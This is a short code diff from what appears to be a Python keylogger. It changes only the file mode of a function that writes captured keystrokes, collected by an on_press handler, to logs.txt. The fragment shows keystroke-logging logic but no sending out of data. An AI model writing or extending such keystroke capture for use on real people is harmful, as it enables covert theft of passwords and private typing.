@@ -13,7 +13,7 @@ def on_press(key):
         count=0
         klist=[]
 def wfile(klist):
-    with open("logs.txt",'a') as f:
+    with open("logs.txt",'a+') as f:
         for p in klist:
             k=str(p).replace("'","")
             if k.find('space')!=-1:
